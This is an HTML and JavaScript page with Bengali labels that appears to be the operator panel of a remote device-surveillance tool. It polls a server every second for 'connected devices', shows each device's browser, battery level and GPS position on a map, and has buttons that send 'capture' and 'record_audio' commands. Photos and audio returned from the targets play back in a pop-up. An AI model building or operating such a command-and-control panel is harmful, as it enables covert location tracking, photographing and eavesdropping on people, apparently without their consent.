<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>অ্যাডমিন ড্যাশবোর্ড</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body { background: #0f172a; color: #e2e8f0; padding: 20px; }
        h1 { text-align: center; margin-bottom: 20px; color: #38bdf8; }
        .dashboard { display: flex; flex-wrap: wrap; gap: 20px; }
        .map-container { flex: 2; min-width: 300px; height: 500px; background: #1e293b; border-radius: 15px; overflow: hidden; }
        #map { height: 100%; width: 100%; }
        .info-panel { flex: 1; min-width: 300px; background: #1e293b; border-radius: 15px; padding: 20px; height: 500px; overflow-y: auto; }
        .info-panel h2 { font-size: 18px; margin-bottom: 15px; border-bottom: 2px solid #334155; padding-bottom: 10px; }
        .device-card { background: #0f172a; padding: 15px; border-radius: 10px; margin-bottom: 15px; border-left: 4px solid #38bdf8; cursor: pointer; transition: 0.2s; }
        .device-card:hover { background: #1e293b; transform: scale(1.02); }
        .device-card .name { font-weight: bold; font-size: 16px; color: #38bdf8; }
        .device-card .detail { font-size: 13px; color: #94a3b8; margin-top: 6px; line-height: 1.4; }
        .device-card .detail b { color: #e2e8f0; }
        .online { border-left-color: #22c55e; }
        .no-data { text-align: center; color: #64748b; margin-top: 50px; }
        
        .action-btns { display: flex; gap: 10px; margin-top: 10px; }
        .btn { flex: 1; color: white; border: none; padding: 8px; border-radius: 5px; font-size: 12px; cursor: pointer; font-weight: bold; }
        .btn-capture { background: #ef4444; }
        .btn-audio { background: #8b5cf6; }

        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); justify-content: center; align-items: center; }
        .modal-content { background: #1e293b; padding: 20px; border-radius: 10px; max-width: 90%; text-align: center; }
        .modal-content img { max-width: 100%; max-height: 60vh; border-radius: 5px; background: black; margin-bottom: 15px; }
        .modal-content audio { width: 100%; margin-top: 10px; }
        .close-btn { margin-top: 15px; background: #38bdf8; border: none; padding: 10px 20px; border-radius: 5px; color: white; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <h1>📡 লাইভ মনিটরিং ড্যাশবোর্ড</h1>
    <div class="dashboard">
        <div class="map-container">
            <div id="map"></div>
        </div>
        <div class="info-panel">
            <h2>📱 কানেক্টেড ডিভাইস <span style="font-size:12px; color:#64748b;">(লোকেশন দেখতে ক্লিক করুন)</span></h2>
            <div id="deviceList"></div>
        </div>
    </div>

    <div id="mediaModal" class="modal">
        <div class="modal-content">
            <h3 id="modalTitle" style="margin-bottom: 10px; color: #38bdf8;">মিডিয়া ফাইল</h3>
            <img id="modalImage" src="" style="display: none;" alt="Captured Photo">
            <audio id="modalAudio" controls style="display: none;"></audio>
            <br>
            <button class="close-btn" onclick="closeModal()">বন্ধ করুন</button>
        </div>
    </div>

    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
        let map = L.map('map').setView([23.8103, 90.4125], 12);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            attribution: '&copy; OpenStreetMap'
        }).addTo(map);
        
        let markers = {};
        let circles = {};
        let lastImgTime = {};
        let lastAudTime = {};

        function fetchClients() {
            fetch('/api/clients')
                .then(res => res.json())
                .then(clients => {
                    const list = document.getElementById('deviceList');
                    list.innerHTML = '';
                    const clientIds = Object.keys(clients);

                    if (clientIds.length === 0) {
                        list.innerHTML = '<div class="no-data">কোনো ডিভাইস কানেক্ট হয়নি।</div>';
                        return;
                    }

                    clientIds.forEach(id => {
                        const data = clients[id];
                        const card = document.createElement('div');
                        card.className = 'device-card online';
                        
                        card.onclick = () => {
                            if (data.lat && data.lng) map.setView([parseFloat(data.lat), parseFloat(data.lng)], 16);
                        };
                        
                        card.innerHTML = `
                            <div class="name">📱 ${data.device || 'অজানা ডিভাইস'}</div>
                            <div class="detail">🌐 ব্রাউজার: <b>${data.browser || 'N/A'}</b></div>
                            <div class="detail">🔋 ব্যাটারি: <b>${data.battery || 'N/A'}%</b></div>
                            <div class="detail">📍 অবস্থান: <b>${data.lat ? parseFloat(data.lat).toFixed(5) : 'N/A'}, ${data.lng ? parseFloat(data.lng).toFixed(5) : ''}</b></div>
                            <div class="action-btns">
                                <button class="btn btn-capture" onclick="event.stopPropagation(); sendCommand('${id}', 'capture')">📸 ছবি</button>
                                <button class="btn btn-audio" onclick="event.stopPropagation(); sendCommand('${id}', 'record_audio')">🎙️ অডিও</button>
                            </div>
                        `;
                        list.appendChild(card);

                        if (data.camera_image && data.camera_time && lastImgTime[id] !== data.camera_time) {
                            lastImgTime[id] = data.camera_time;
                            showMedia('image', data.camera_image);
                        }
                        if (data.audio_data && data.audio_time && lastAudTime[id] !== data.audio_time) {
                            lastAudTime[id] = data.audio_time;
                            showMedia('audio', data.audio_data);
                        }

                        if (data.lat && data.lng) {
                            const pos = [parseFloat(data.lat), parseFloat(data.lng)];
                            if (markers[id]) {
                                markers[id].setLatLng(pos);
                                if(circles[id]) circles[id].setLatLng(pos);
                            } else {
                                markers[id] = L.marker(pos).addTo(map);
                                circles[id] = L.circle(pos, { radius: data.accuracy || 50, color: '#38bdf8', fillOpacity: 0.2 }).addTo(map);
                            }
                        }
                    });
                });
        }

        function sendCommand(clientId, command) {
            fetch('/api/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ client_id: clientId, command: command })
            }).catch(err => console.error(err));
        }

        function showMedia(type, src) {
            const modal = document.getElementById('mediaModal');
            const img = document.getElementById('modalImage');
            const audio = document.getElementById('modalAudio');
            const title = document.getElementById('modalTitle');

            if (type === 'image') {
                title.innerText = "📸 ক্যামেরার ছবি";
                img.src = src;
                img.style.display = 'block';
                audio.style.display = 'none';
                audio.pause();
            } else if (type === 'audio') {
                title.innerText = "🎙️ রেকর্ড করা অডিও";
                audio.src = src;
                audio.style.display = 'block';
                img.style.display = 'none';
                audio.play();
            }
            modal.style.display = 'flex';
        }

        function closeModal() {
            document.getElementById('mediaModal').style.display = 'none';
            document.getElementById('modalAudio').pause();
        }

        fetchClients();
        setInterval(fetchClients, 1000);
    </script>
</body>
</html>
